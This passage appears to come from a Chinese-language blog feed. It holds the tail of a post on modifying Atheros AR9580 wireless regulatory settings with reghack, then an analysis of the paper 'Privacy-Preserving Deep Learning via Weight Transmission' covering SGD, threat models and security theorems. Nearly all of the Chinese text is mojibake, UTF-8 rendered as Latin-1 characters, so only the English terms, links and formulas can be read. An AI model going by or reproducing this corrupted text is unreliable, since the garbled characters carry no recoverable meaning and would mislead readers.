title="é¢ä¸´çš„é—®é¢˜"></a>é¢ä¸´çš„é—®é¢˜</h3><p>æˆåŠŸç‡ä¸èƒ½ä¿è¯</p><p>è€ç‰ˆæœ¬çš„reghackä¸ç¡®å®šå¯¹æ–°ç‰ˆæœ¬çš„å†…æ ¸æ¨¡å—æœ‰ç”¨ï¼Œå¯èƒ½éœ€è¦äº†è§£ä¿®æ”¹çš„åŸç†</p><p>å†…æ ¸ç¼–è¯‘æ—¶éœ€è¦å…³é—­å¯†é’¥éªŒè¯æœºåˆ¶ï¼Œæ˜¯å¦å¯¹å®‰å…¨æ€§æœ‰å½±å“</p><h2 id="æ–°çš„-Reghack"><a href="#æ–°çš„-Reghack" class="headerlink" title="æ–°çš„ Reghack"></a>æ–°çš„ Reghack</h2><p>è¯¥æ–¹æ³•ä¼˜ç‚¹æ˜¯çœ‹èµ·æ¥ååˆ†çš„æ¸…æ™°å…¨é¢ï¼Œæ„Ÿè§‰æˆåŠŸç‡æœ‰ä¿è¯ï¼Œç¼ºç‚¹æ˜¯æœ‰é’ˆå¯¹æ€§çš„æ˜¯é’ˆå¯¹wdr4310v1ï¼Œä½†é«˜å…´çš„æ˜¯è¯¥è·¯ç”±å™¨çš„wirelessç¡¬ä»¶å°±æ˜¯Atheros AR9580,<strong>å¯èƒ½</strong>å°±æ˜¯ä¸€æ ·çš„ï¼Œä½†è¿˜æ˜¯éœ€è¦è‡ªå·±çš„<strong>ART</strong> fileï¼Œä¸”ä»–æ˜¯åŸºäºAR9300çš„ï¼Œä¸”LEDE-openwrtå¥½åƒä¸æ”¯æŒæˆ‘ä»¬è¿™ä¸ªç¡¬ä»¶ã€‚</p><p><a href="https://github.com/tete1030/reghack">ä»“åº“åœ°å€</a></p><h2 id="æ›´æ”¹EEPROM"><a href="#æ›´æ”¹EEPROM" class="headerlink" title="æ›´æ”¹EEPROM"></a>æ›´æ”¹EEPROM</h2><p>åˆ©ç”¨ <a href="https://github.com/rsa9000/atheepmgr">atheepmgr</a> æŸ¥çœ‹EEPROMåœ¨linuxç¼–è¯‘çš„æ—¶å€™è®¾ç½®äº†æƒé™ æ²¡æœ‰åŠæ³•dumpå’Œæ›´æ”¹ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WIFI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>privacy-preserving deep-learning via weight Transmission</title>
      <link href="/2021/03/20/Transmission/"/>
      <url>/2021/03/20/Transmission/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡é’ˆå¯¹ã€ŠPrivacy-Preserving Deep Learning via Weight Transmissionã€‹è¯¥ç¯‡è®ºæ–‡è¿›è¡Œäº†åˆ†æ</p><p>æ¯”è¾ƒå…¨é¢ </p><a id="more"></a><h3 id="è®ºæ–‡é¢˜ç›®ç†è§£"><a href="#è®ºæ–‡é¢˜ç›®ç†è§£" class="headerlink" title="è®ºæ–‡é¢˜ç›®ç†è§£"></a>è®ºæ–‡é¢˜ç›®ç†è§£</h3><p>æœ¬æ–‡è®¾ç«‹äº†ä¸€ä¸ªèƒ½ä¿æŠ¤éšç§çš„æ·±åº¦å­¦ä¹ ç®—æ³•ï¼Œæ ¹æ®æœ¬æ–‡çš„å†…å®¹ï¼Œæˆ‘å°†åŸé¢˜ç›®ã€ŠPrivacy-Preserving Deep Learning via Weight Transmissionã€‹æ‰©å±•ä¸ºã€ŠPrivacy-preserving SGD for distributed trainers via weight transmissionã€‹å³é€šè¿‡æƒé‡ä¼ è¾“å®ç°çš„é’ˆå¯¹åˆ†å¸ƒå¼è®­ç»ƒè€…çš„éšç§ä¿æŠ¤éšæœºæ¢¯åº¦ä¸‹é™ç®—æ³•ï¼Œé€šè¿‡å¯¹é¢˜ç›®çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“æœ¬æ–‡çš„ä¹¦å†™ç¯å¢ƒå’Œç›®çš„å¦‚ä¸‹ï¼š</p><ul><li><p>ç®—æ³• ï¼šSGD éšæœºæ¢¯åº¦ä¸‹é™</p></li><li><p>ç›®çš„ ï¼šéšç§ä¿æŠ¤</p></li><li><p>ç¯å¢ƒ ï¼šåˆ†å¸ƒå¼ç¥ç»ç½‘è·¯ &amp; æ·±åº¦å­¦ä¹ </p></li></ul><h3 id="è®ºæ–‡èƒŒæ™¯çŸ¥è¯†"><a href="#è®ºæ–‡èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="è®ºæ–‡èƒŒæ™¯çŸ¥è¯†"></a>è®ºæ–‡èƒŒæ™¯çŸ¥è¯†</h3><h4 id="èƒŒæ™¯çŸ¥è¯†ä¸€ï¼š"><a href="#èƒŒæ™¯çŸ¥è¯†ä¸€ï¼š" class="headerlink" title="èƒŒæ™¯çŸ¥è¯†ä¸€ï¼š"></a>èƒŒæ™¯çŸ¥è¯†ä¸€ï¼š</h4><p>æœ¬æ–‡æ˜¯åœ¨SGDéšæœºæ¢¯åº¦ä¸‹é™ç®—æ³•çš„åŸºç¡€ä¸Šè¿›è¡Œæ”¹è¿›å’Œæ‰©å±•çš„ã€‚ä¸ºäº†ä»‹ç»SGDï¼Œæˆ‘ä»¬é¦–å…ˆä»‹ç»ä¸€ä¸‹GDæœ€é€Ÿæ¢¯åº¦ä¸‹é™ç®—æ³•-Gradient Descentï¼Œè¯¥ç®—æ³•æ˜¯é€šè¿‡è®¡ç®—ç»™å®šæ•°æ®é›†çš„å¯¼æ•°ï¼Œä½¿å‡½æ•°ä¸æ–­æ”¶æ•›è‡³Jå‡½æ•°-cost functionçš„æœ€å°å€¼ï¼Œå¾—åˆ°ç»“æœï¼Œè¯¥æ–¹æ³•çš„å…·ä½“æ•°å­¦å…¬å¼ä¸º<br>$$<br>x_{t+1} = x_t - \eta_t\nabla f(x_t)<br>$$<br>å…¶ä¸­$\eta_t$ä¸ºæ­¥é•¿ï¼Œ  ä¸º$\nabla f(x_t)$å¯¼æ•°ï¼Œè¯¥æ–¹æ³•æœ‰ä¸¤ä¸ªç¼ºç‚¹ï¼š</p><ol><li>ä¸ºäº†ä¿è¯å‡†ç¡®æ€§$\nabla f(x_t)$éœ€è¦æ˜¯ä¸€ä¸ªç²¾ç¡®çš„å¯¼æ•°ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œå¾ˆå¤šæ¬¡è¿­ä»£çš„è¿ç®—æ‰èƒ½å¾—åˆ°ç»“æœ</li><li>è¯¥æ–¹æ³•æ— æ³•é€ƒç¦»éç‚¹å’Œå±€éƒ¨æœ€ä¼˜ç‚¹è¿™ç§å¯¼æ•°ä¸º0ä½†æ˜¯ä¸æ˜¯æœ€å°å€¼çš„ç‚¹ã€‚</li></ol><p>å› æ­¤æˆ‘ä»¬å¼•å…¥äº†SGDç®—æ³•ï¼Œè¯¥ç®—æ³•ä¸ºéšæœºæœ€é€Ÿä¸‹é™ç®—æ³•-Stochastic Gradient Descentã€‚ä»–çš„ä¸»è¦æ€æƒ³æ˜¯åˆ©ç”¨åŒ…å«å™ªå£°çš„å…·æœ‰éšæœºæ€§çš„å¯¼æ•°ä½¿å¾—ä¸‹é™è¿‡ç¨‹ä¸ç»è¿‡éç‚¹å’Œå±€éƒ¨æœ€ä¼˜ç‚¹ã€‚å…¶ä¸­éšæœºå¯¼æ•°ä»…è¦æ±‚æœŸæœ›ä¸ºå•æ•°å³å¯ï¼Œæ•°å­¦è¡¨è¾¾ä¸º  ã€‚è¯¥æ–¹æ³•çš„å…¨éƒ¨æ•°å­¦è¡¨è¾¾ä¸ºï¼š<br>$$<br>G_t = \frac{\delta J(W_{t-1},X_t,Y_t)}{\delta W} \\<br>W_t = W_{t-1} - \alpha(t)Â·G_t<br>$$<br>å…¶ä¸­ J å‡½æ•°ä¸ºcost functionï¼Œå³å¯¹ç»“æœä¼˜è‰¯æ€§çš„è¡¡é‡å‡½æ•°ï¼ŒWä¸ºæƒå€¼å‚æ•°ï¼Œæ˜¯æ¯ä¸€ä¸ªå±æ€§å¯¹ç»“æœçš„æƒé‡å½±å“ã€‚$\alpha_t$ä¸ºæ­¥é•¿,$G_t$ä¸ºéšæœºå¯¼æ•°ã€‚ç›¸æ¯”äºGDï¼ŒSGDæœ‰ä»¥ä¸‹çš„ä¼˜è‰¯ç‰¹æ€§ï¼š</p><ol><li>å¯¼æ•°å¯ä»¥åŒ…å«å™ªå£°ï¼Œæ‰€ä»¥ç®—å¾—å¾ˆå¿«ï¼Œä¸”å¤§é‡çš„ç†è®ºå·¥ä½œè¯´æ˜ï¼Œåªè¦å™ªå£°ä¸ç¦»è°±ï¼Œå…¶å®ï¼ˆè‡³å°‘åœ¨fæ˜¯å‡¸å‡½æ•°çš„æƒ…å†µä¸‹ï¼‰ï¼ŒSGDéƒ½èƒ½å¤Ÿå¾ˆå¥½åœ°æ”¶æ•›ã€‚</li><li>å®ƒèƒ½å¤Ÿè‡ªåŠ¨é€ƒç¦»éç‚¹ï¼Œè‡ªåŠ¨é€ƒç¦»æ¯”è¾ƒå·®çš„å±€éƒ¨æœ€ä¼˜ç‚¹ã€‚</li><li>æœ€åæ‰¾åˆ°çš„ç­”æ¡ˆè¿˜å…·æœ‰å¾ˆå¼ºçš„ä¸€èˆ¬æ€§ï¼ˆgeneralizationï¼‰ï¼Œå³èƒ½å¤Ÿåœ¨è‡ªå·±ä¹‹å‰æ²¡æœ‰è§è¿‡ä½†æ˜¯æœä»åŒæ ·åˆ†å¸ƒçš„æ•°æ®é›†ä¸Šè¡¨ç°éå¸¸å¥½ã€‚</li></ol><p>è¿™äº›ä¼˜è‰¯çš„æ€§è´¨ä½¿å¾—SGDæˆä¸ºæ·±åº¦å­¦ä¹ é¢†åŸŸè¾ƒä¸ºæ™®éä¸”ä¼˜è‰¯çš„ç®—æ³• ï¼Œè¿™ä¹Ÿæ˜¯æœ¬æ–‡é€‰æ‹©è¿™ä¸ªç®—æ³•çš„åŸå› ä¹‹ä¸€ã€‚</p><p>æœ¬æ–‡è¿˜æœ‰å…¶ä»–æœ‰å…³éšç§ä¿æŠ¤<code>Privacy-preserving</code>çš„èƒŒæ™¯çŸ¥è¯†ä¸ºï¼š</p><h4 id="Honest-but-Curious"><a href="#Honest-but-Curious" class="headerlink" title="Honest-but-Curious"></a>Honest-but-Curious</h4><p>é¦–å…ˆæœ¬æ–‡å‡å®šserveræ˜¯è¯šå®ä½†å¥½å¥‡çš„(honest-but-curious)ï¼Œè¯¥æ¨¡å‹åˆè¢«ç§°ä¸ºåŠè¯šå®æ¨¡å‹(semi-Honest model)ï¼Œå…¶ä¸­</p><ul><li>è¯šå®æ„ä¸ºç»“ç‚¹ä¼šè¯šå®çš„å°†ä»–çš„å·¥ä½œå…¨éƒ¨å®Œæˆï¼Œ</li><li>å¥½å¥‡æ„å‘³ç€ç»“ç‚¹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šå°†ä»–æ‰€æœ‰çš„æ•°æ®å…¨éƒ¨ä¿å­˜ä¸‹æ¥å¹¶åœ¨åç»­æ—¶åˆ©ç”¨ä»–ä»¬è¿›è¡Œæ¨æµ‹æ”»å‡»ã€‚</li></ul><h4 id="Collusion"><a href="#Collusion" class="headerlink" title="Collusion"></a>Collusion</h4><p>ç›¸å…³çš„ï¼Œæœ¬æ–‡å‡å®šçš„æ”»å‡»è¿˜æœ‰ï¼Œtrainerå’Œserverå°†ä¼šæ˜¯ä¸€ä¼™çš„ï¼Œä»–ä»¬ä¹‹é—´å¯ä»¥è¿›è¡Œå…±è°‹(collusion)æ¥å¯¹æ•°æ®è¿›è¡Œæ”»å‡»ã€‚</p><h3 id="è®ºæ–‡çš„ä¸»è¦è´¡çŒ®"><a href="#è®ºæ–‡çš„ä¸»è¦è´¡çŒ®" class="headerlink" title="è®ºæ–‡çš„ä¸»è¦è´¡çŒ®"></a>è®ºæ–‡çš„ä¸»è¦è´¡çŒ®</h3><ol><li>èˆå¼ƒäº†ä¼ ç»Ÿæ¢¯åº¦ä¼ è¾“çš„æ–¹æ³•è€Œé€‰ç”¨æƒå€¼ä¼ è¾“æ¥å¤§å¹…æé«˜å®‰å…¨æ€§ã€‚</li><li>æœ¬æ–‡ä½¿ç”¨çš„æ–¹æ³•é€‚ç”¨äºæ·±åº¦å­¦ä¹ é€‚ç”¨çš„æ‰€æœ‰æ¿€æ´»å‡½æ•°ï¼Œè¿™æ„å‘³ç€ä¸ä¼šé€‚ç”¨è¿‘ä¼¼ç®—æ³•ã€‚</li><li>æœ¬æ–‡é€šè¿‡ä¸¥æ ¼çš„ç†è®ºè¯æ˜è¯šå®ä½†å¥½å¥‡çš„serverå’Œæç«¯å…±è°‹ï¼Œå³åªæœ‰ä¸€ä¸ªtrainerå¯ä¿¡çš„æƒ…å†µä¸‹ï¼Œæœ¬æ–‡çš„æ–¹æ³•ä¾ç„¶æœ‰æé«˜çš„å®‰å…¨æ€§ã€‚</li><li>é€šè¿‡ä¸€ä¸ªè¯æ˜è¡¨è¾¾äº†æœ¬æ–‡åœ¨å‡†ç¡®æ€§æ–¹é¢å’Œå°†æ‰€æœ‰æ•°æ®é›†é›†æˆåœ¨ä¸€ä¸ªè®­ç»ƒè€…è®­ç»ƒçš„ç»“æœå‡†ç¡®æ€§æ˜¯ç›¸åŒçš„ã€‚</li></ol><h2 id="è®ºæ–‡ä¸»è¦å†…å®¹"><a href="#è®ºæ–‡ä¸»è¦å†…å®¹" class="headerlink" title="è®ºæ–‡ä¸»è¦å†…å®¹"></a>è®ºæ–‡ä¸»è¦å†…å®¹</h2><h3 id="æƒå€¼ä¼ è¾“"><a href="#æƒå€¼ä¼ è¾“" class="headerlink" title="æƒå€¼ä¼ è¾“"></a>æƒå€¼ä¼ è¾“</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦ä¸ºå¤§å®¶è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆæƒå€¼ä¼ è¾“ç›¸æ¯”æ¢¯åº¦ä¼ è¾“æ‹¥æœ‰æ›´é«˜çš„å®‰å…¨æ€§å’Œä¿æŠ¤éšç§æ€§ï¼Œæœ¬ç¯‡æ–‡ç« é€šè¿‡è·Ÿä¹‹å‰ä¸¤ç¯‡æ–‡ç« çš„æ¯”è¾ƒæ¥è¯´æ˜ã€‚</p><p>ç¬¬ä¸€ç¯‡çš„ä¸»è¦æ€æƒ³æ˜¯åªä¼ è¾“éšæœºé€‰æ‹©çš„éƒ¨åˆ†æ¢¯åº¦è€Œæ”¾å¼ƒä¼ ç»Ÿçš„åŠ å¯†æ–¹æ³•ï¼Œå°½ç®¡åœ¨Sec.7 ä¸­æ–‡ç« ä½œè€…åˆåˆ©ç”¨äº†å·®åˆ†éšç§å¢åŠ æ‹‰æ™®æ‹‰æ–¯å™ªå£°çš„æ–¹æ³•ï¼Œä½†æ˜¯æ•°æ®ä¿å¯†æ€§å’Œå·®åˆ†éšç§æ˜¯æ­£äº¤çš„ï¼Œæ‰€ä»¥ä»å¯èƒ½é€ æˆæ³„éœ²ã€‚</p><blockquote><p>R. Shokri and V. Shmatikov, â€œPrivacy-preserving deep learning,â€ in Proc. 22nd ACM SIGSAC Conf. Comput. Commun. Secur., I. Ray, N. Li, and C. Kruegel, Eds., Oct. 2015, pp. 1310â€“1321.</p></blockquote><p>ç¬¬äºŒç¯‡æ–‡ç« ä¸»è¦æ˜¯ä½¿ç”¨åŒæ€åŠ å¯†çš„æ–¹æ³•ï¼Œè™½ç„¶è¿›è¡Œäº†åŠ å¯†ï¼Œä½†æ˜¯åœ¨å…±è°‹çš„æƒ…å†µä¸‹ï¼Œåäººå¯¹å…¶è¿›è¡Œè§£å¯†å¹¶å¾—åˆ°åŸå§‹æ¢¯åº¦ï¼Œä»ç„¶ä¼šå¯¹æ•°æ®é€ æˆæ³„éœ²ã€‚æ‰€ä»¥æ¢¯åº¦ä¼ è¾“çš„æ–¹æ³•æ€»å½’ä¼šé€ æˆæ•°æ®çš„æ³„éœ²ï¼Œæˆ‘ä»¬é€‰æ‹©æƒå€¼ä¼ è¾“çš„æ–¹æ³•æ¥é¿å…è¿™ç§æ³„éœ²ã€‚è¿™æ ·åšçš„å…·ä½“åŸå› æˆ‘ä»¬ä¼šåœ¨theorem2 ä¸­è¿›è¡Œè®²è§£</p><blockquote><p>L. T. Phong, Y. Aono, T. Hayashi, L. Wang, and S. Moriai, â€œPrivacypreserving deep learning via additively homomorphic encryption,â€ IEEE Trans. Inf. Forensics Security, vol. 13, no. 5, pp. 1333â€“1345, May 2018.</p></blockquote><h3 id="SNT-amp-FNT"><a href="#SNT-amp-FNT" class="headerlink" title="SNT &amp; FNT"></a>SNT &amp; FNT</h3><p>æœ¬æ–‡æä¾›äº†ä¸¤ç§ç³»ç»ŸSNTï¼ŒFNTå…¶ä¸­å¤§éƒ¨åˆ†å†…å®¹æˆ‘ä»¬åœ¨SNTå†…å°±è®²åˆ°æ‰€ä»¥æˆ‘ä»¬ä¼šè¯¦ç»†ä»‹ç»SNTï¼Œå¹¶ä¹‹åç®€è¦æ¶‰åŠFNTã€‚æˆ‘ä»¬é¦–å…ˆæ˜ç¡®åœ¨åˆ†å¸ƒå¼å­¦ä¹ è¿‡ç¨‹ä¸­ï¼Œæ¯æ¬¡è¿›è¡Œä¸€ä¸ªå¤§çš„å¾ªç¯å³æ¯ä¸ªtraineréƒ½è¿›è¡Œä¸€æ¬¡ï¼ŒåŒ…å«å¯¹äºæ¯ä¸€ä¸ªtrainerçš„å°å¾ªç¯ã€‚å…¶ä¸­æ¯ä¸ªç¬¦å·çš„æ„ä¹‰åŠè¯´æ˜å¦‚ä¸‹ï¼Œ</p><ol><li> serverç«¯æ˜¯Honest-but-curious çš„ã€‚</li><li>Dataseti æŒ‡ä»£æ¯ä¸ªäººèƒ½æŒæ¡çš„æ•°æ®é›†ã€‚</li><li>ï¼ˆX,Yï¼‰æ˜¯Datasetçš„å­é›†ï¼Œä¸”æ ¹æ®åˆ†å¸ƒä¸åŒå¯ä»¥æ˜¯æ•´ä¸ªæ•°æ®é›†æˆ–è€…éšæœºé€‰æ‹©çš„ä¸€éƒ¨åˆ†ã€‚</li><li>Kæ˜¯trainer é—´å…±äº«çš„å¯†é’¥ï¼Œä½†æ˜¯ä¸èƒ½å‘Šè¯‰ server â€“FNT å°±ä¸éœ€è¦äº†ã€‚</li><li>$Enc_k(W)$æ˜¯ç”¨kå¯†é’¥å¯¹Wè¿›è¡ŒåŠ å¯†ã€‚</li><li>encW æ˜¯åŠ å¯†åçš„å¯†æ–‡ã€‚</li><li> $Dec_k(C)$æ˜¯ç”¨Kå¯†é’¥å¯¹Cè¿›è¡Œè§£å¯†ã€‚</li><li>$W_0$æ˜¯éšæœºé€‰æ‹©çš„åˆå§‹æƒé‡ã€‚å…¶ä¸­é™¤Kä»¥å¤–çš„æ‰€æœ‰å˜é‡éƒ½æ˜¯vectorå½¢å¼å‡ºç°çš„ã€‚</li></ol><p>æ¯ä¸ªtraineræ‰§è¡Œçš„æ“ä½œå¦‚ä¸‹:<br>$$<br>W_1=Dec_k(encW_1) \\<br>G_2 = \frac{\delta J(W_1,X_2,Y_2)}{\delta W} \\<br>W_2 = W_1 - \alpha(t)Â·G_2 \\<br>encW_2 = Enc_k(W_2)<br>$$<br>â€‹      </p><p>ç„¶åå°†encWä¼ ç»™serverï¼Œå¹¶ç”±serverç«¯å‘é€ç»™ä¸‹ä¸€ä¸ªtrainerã€‚</p><img src="/2021/03/20/Transmission/snt.png" class="" title="snt"><p>  *<em>FNT</em>***ç³»ç»Ÿæ˜¯å…¨è¿æ¥çš„,è¿™å°±äº§ç”Ÿäº†ä¸€ä¸ªé—®é¢˜ï¼Œç»è¿‡æˆ‘ä»¬å¯¹äºSNTçš„æè¿°æ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥å›ºå®šçš„é¡ºåºè¿›è¡Œè®­ç»ƒï¼Œé‚£æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦å…¨è¿æ¥ï¼Œå¢åŠ è¿™ä¹ˆå¤šçš„è·¯å¾„å‘¢ï¼ŒåŸå› æœ‰ä»¥ä¸‹ä¸‰ç‚¹ï¼š</p><ol><li>å¦‚æœè·¯å¾„å¤±æ•ˆï¼Œé‚£ä¹ˆç³»ç»Ÿå¯èƒ½ä¼šå› æ­¤åæ‰ï¼Œæ‰€ä»¥å…¨è¿æ¥ä¼šå¢åŠ å¯é æ€§ã€‚</li><li>å…¨è¿æ¥çš„æ–¹æ³•å¯ä»¥é€‚åº”éšæœºå‘é€çš„å·¥ä½œæ¨¡å¼ï¼Œè€Œä¸ç”¨åªèƒ½æŒ‰é¡ºåºå‘é€ã€‚</li><li>å¯ä»¥å®ç°åŒ¿åä¼ è¾“çš„å®‰å…¨æªæ–½ï¼Œè¿™ä¸ªæˆ‘ä»¬æ¥ä¸‹æ¥ä¼šè®²ã€‚</li></ol><img src="/2021/03/20/Transmission/fnt.png" class="" title="fnt"><h3 id="å®‰å…¨-åŠ-å‡†ç¡®æ€§-ç†è®ºè§£é‡Š"><a href="#å®‰å…¨-åŠ-å‡†ç¡®æ€§-ç†è®ºè§£é‡Š" class="headerlink" title="å®‰å…¨ åŠ å‡†ç¡®æ€§ ç†è®ºè§£é‡Š"></a>å®‰å…¨ åŠ å‡†ç¡®æ€§ ç†è®ºè§£é‡Š</h3><h4 id="ç†è®ºä¸€ï¼šç³»ç»Ÿåœ¨é¢å¯¹è¯šå®ä½†å¥½å¥‡çš„æœåŠ¡ç«¯ä¸‹çš„å®‰å…¨"><a href="#ç†è®ºä¸€ï¼šç³»ç»Ÿåœ¨é¢å¯¹è¯šå®ä½†å¥½å¥‡çš„æœåŠ¡ç«¯ä¸‹çš„å®‰å…¨" class="headerlink" title="ç†è®ºä¸€ï¼šç³»ç»Ÿåœ¨é¢å¯¹è¯šå®ä½†å¥½å¥‡çš„æœåŠ¡ç«¯ä¸‹çš„å®‰å…¨"></a>ç†è®ºä¸€ï¼šç³»ç»Ÿåœ¨é¢å¯¹è¯šå®ä½†å¥½å¥‡çš„æœåŠ¡ç«¯ä¸‹çš„å®‰å…¨</h4><p>æˆ‘ä»¬ä½¿ç”¨å¯¹ç§°åŠ å¯†æ–¹æ³•ä½¿serverç«¯åªèƒ½çœ‹è§åŠ å¯†åçš„Wæƒé‡ï¼Œæˆ‘ä»¬é€‰ç”¨èƒ½æŠµæŠ—é€‰æ‹©çš„å¯¹ç§°åŠ å¯†æ–¹æ³•å³å¯ã€‚</p><h4 id="ç†è®ºäºŒï¼šåœ¨é¢å¯¹æç«¯å…±è°‹collusionä¸‹çš„å®‰å…¨æ€§"><a href="#ç†è®ºäºŒï¼šåœ¨é¢å¯¹æç«¯å…±è°‹collusionä¸‹çš„å®‰å…¨æ€§" class="headerlink" title="ç†è®ºäºŒï¼šåœ¨é¢å¯¹æç«¯å…±è°‹collusionä¸‹çš„å®‰å…¨æ€§"></a>ç†è®ºäºŒï¼šåœ¨é¢å¯¹æç«¯å…±è°‹collusionä¸‹çš„å®‰å…¨æ€§</h4><p>æç«¯å…±è°‹å³å½“åªæœ‰trainer1å¯ä¿¡ï¼Œtrainer2-l,serveréƒ½ä¸å¯ä¿¡çš„æƒ…å†µä¸‹,åäººä¹Ÿä¸èƒ½è®¡ç®—å‡ºtrainer1çš„æ•°æ®é›†ä¿¡æ¯ï¼Œé™¤éä»–ä»¬è§£å†³éçº¿æ€§é—®é¢˜æˆ–å­é›†å’Œé—®é¢˜</p><p>å…¶ä¸­<strong>éçº¿æ€§é—®é¢˜</strong>ä»£è¡¨æˆ‘ä»¬åœ¨è¿›è¡Œè®¡ç®—æ—¶ï¼Œæˆ‘ä»¬é€‰æ‹©çš„æ¿€æ´»å‡½æ•°éƒ½æ˜¯éçº¿æ€§å‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä»è®¡ç®—å‡ºæ¥çš„æƒå€¼æ¢å¤æ•°æ®é›†çš„æœ¬èº«æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦è§£å†³éçº¿æ€§é—®é¢˜ï¼Œè€Œè¿™ç§é—®é¢˜æ˜¯ååˆ†éš¾è§£çš„</p><p>å­é›†å’Œé—®é¢˜çš„è®²è§£æˆ‘ä»¬éœ€è¦å€ŸåŠ©ä¸€äº›æ•°å­¦å…¬å¼ï¼Œé¦–å…ˆæˆ‘ä»¬æ˜ç¡®çš„æ˜¯ï¼Œåœ¨æ¯ä¸ªè®­ç»ƒè€…ç»å†çš„ä¸€æ¬¡å°å¾ªç¯ä¸­ï¼Œä»–éœ€è¦æ‰§è¡Œæœ‰å¤šä¸ªå…¬å¼ç»„æˆçš„(1)å·å¼å­ï¼Œå¹¶é€šè¿‡åŒ–ç®€å¾—åˆ°åˆ°ï¼ˆ2ï¼‰å·å¼å­ï¼Œå› ä¸ºæˆ‘ä»¬å‡å®šå‰åtrainerçŸ¥é“åˆå§‹çš„Wå’Œç»“æŸåçš„Wï¼Œé‚£ä¹ˆä»–æœªçŸ¥çš„å°±æ˜¯è®¡ç®—åçš„(3)å·å¼å­ã€‚<br>$$<br>G_1 = \frac{\delta J(W_{0},X_1,Y_1)}{\delta W} \\<br>W_1 = W_{0} - \alpha(1)Â·G_1 \\<br>\vdots \\<br>G_i = \frac{\delta J(W_{i-1},X_i,Y_i)}{\delta W} \\<br>W_i = W_{i-1} - \alpha(i)Â·G_i \\<br>\vdots \\<br>G_n = \frac{\delta J(W_{n-1},X_n,Y_n)}{\delta W} \\<br>W_n = W_{n-1} - \alpha(n)Â·G_n     (1)<br>$$</p><p>$$<br>W^{(final)} = W_n \\<br>= W_n-1 - \alpha_nG_n \\<br>= W_n-2 - \alpha_{n-1}G_{n-1} - \alpha_nG_n \\<br>\vdots \\<br>= w_0 - (\alpha_{1}G_{1} + \dots + \alpha_nG_n) \\<br>= W^{(init)} - (\alpha_{1}G_{1} + \dots + \alpha_nG_n) (2) \\<br>W^{(init)} - W^{(final)} = (\alpha_{1}G_{1} + \dots + \alpha_nG_n) (3)<br>$$</p><p>å…¶ä¸­ç¬¦å·çš„å®šä¹‰å¦‚ä¸‹</p><ul><li><p> (ğ‘‹_ğ‘–,ğ‘Œ_ğ‘–) (1â‰¤ğ‘–â‰¤ğ‘›)æ˜¯Dataset1æ´—ç‰Œåçš„ä¸€å°éƒ¨åˆ†</p></li><li><p> ğ›¼_ğ‘–<em>å¯ä»¥æ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯trainer1è‡ªå·±é€‰æ‹©çš„</em></p></li><li><p> ğ‘› = |ğ·ğ‘ğ‘¡ğ‘ğ‘ ğ‘’ğ‘¡1|/ğ‘ğ‘ğ‘¡ğ‘â„_ğ‘ ğ‘–ğ‘§ğ‘’â‰«1</p></li></ul><p>æˆ‘ä»¬çœ‹åˆ°ï¼Œæˆ‘ä»¬å·²çŸ¥ï¼ˆ3ï¼‰å¼çš„å’Œï¼Œä¸”næ˜¯ååˆ†å¤§çš„ã€‚ç®—å¾—æ¯ä¸ªå€¼æ˜¯ä¸€ä¸ªNP-Completeéš¾è§£é—®é¢˜ï¼Œéœ€è¦å¤šé¡¹å¼æœªçŸ¥çš„æ—¶é—´å¤æ‚åº¦ã€‚æ‰€ä»¥ä»–æ˜¯å®‰å…¨çš„ã€‚</p><h4 id="å®šç†ä¸‰ï¼šåˆ†å¸ƒå¼çš„æ•°æ®é›†çš„è¿ç®—ä¸åœ¨ä¸€ä¸ªä¸»æœºä¸Šå¯¹æ‰€æœ‰æ•°æ®é›†çš„å¹¶é›†è¿›è¡Œè¿ç®—å¾—åˆ°çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚"><a href="#å®šç†ä¸‰ï¼šåˆ†å¸ƒå¼çš„æ•°æ®é›†çš„è¿ç®—ä¸åœ¨ä¸€ä¸ªä¸»æœºä¸Šå¯¹æ‰€æœ‰æ•°æ®é›†çš„å¹¶é›†è¿›è¡Œè¿ç®—å¾—åˆ°çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚" class="headerlink" title="å®šç†ä¸‰ï¼šåˆ†å¸ƒå¼çš„æ•°æ®é›†çš„è¿ç®—ä¸åœ¨ä¸€ä¸ªä¸»æœºä¸Šå¯¹æ‰€æœ‰æ•°æ®é›†çš„å¹¶é›†è¿›è¡Œè¿ç®—å¾—åˆ°çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚"></a>å®šç†ä¸‰ï¼šåˆ†å¸ƒå¼çš„æ•°æ®é›†çš„è¿ç®—ä¸åœ¨ä¸€ä¸ªä¸»æœºä¸Šå¯¹æ‰€æœ‰æ•°æ®é›†çš„å¹¶é›†è¿›è¡Œè¿ç®—å¾—åˆ°çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚</h4><p>  è¯¥å®šç†åœ¨é€»è¾‘ä¸Šç†è§£å°±å¯ä»¥ï¼Œæ–‡ä¸­ä¹Ÿåªç»™äº†æè¿°æ€§çš„è¯æ˜</p><img src="/2021/03/20/Transmission/fig3.jpg" class="" title="fig3"><hr><h3 id="é™„åŠ è€ƒè™‘-additional-consideration"><a href="#é™„åŠ è€ƒè™‘-additional-consideration" class="headerlink" title="é™„åŠ è€ƒè™‘ additional consideration"></a>é™„åŠ è€ƒè™‘ additional consideration</h3><p>åœ¨è¯¥ç³»ç»Ÿè¿ç”¨å’Œå®éªŒå®é™…æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œæ–‡ä¸­ä¹Ÿå¢åŠ äº†å¾ˆå¤šå…¶ä»–éä¸»ä½“ç³»ç»Ÿæ¶‰åŠçš„æ–¹æ³•ã€‚</p><h4 